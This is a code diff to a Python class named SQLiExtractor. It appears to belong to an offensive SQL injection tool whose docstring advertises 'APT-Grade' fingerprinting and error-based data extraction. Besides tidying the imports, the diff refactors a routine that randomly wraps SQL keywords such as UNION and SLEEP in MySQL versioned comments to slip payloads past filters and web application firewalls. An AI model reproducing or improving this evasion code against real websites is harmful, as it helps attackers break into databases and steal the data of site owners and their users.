@@ -8,11 +8,12 @@ APT-Grade Enhancements:
 - Multi-DBMS fingerprinting with version-specific payloads
 - Error-based extraction as intermediate fallback
 """
+import asyncio
+import random
 import re
 import time
-import random
-import asyncio
-from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
+from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse
+
 from core.ui import w
 
 
@@ -68,11 +69,10 @@ class SQLiExtractor:
                      "SLEEP", "IF", "CONCAT", "SUBSTR", "ASCII", "LENGTH", "NULL"]
         result = payload
         for kw in keywords:
-            if kw in result.upper():
+            if kw in result.upper() and random.random() > 0.5:
                 # Randomly decide to obfuscate this keyword
-                if random.random() > 0.5:
                     obfuscated = "/*!50000" + kw + "*/"
-                    result = re.sub(r'\b' + kw + r'\b', obfuscated, result, count=1, flags=re.I)
+                    result = re.sub(r'\b' + kw + r'\b', obfuscated, result, count=1, flags=re.IGNORECASE)
         return result
 
     def __init__(self, engine, session_manager=None):
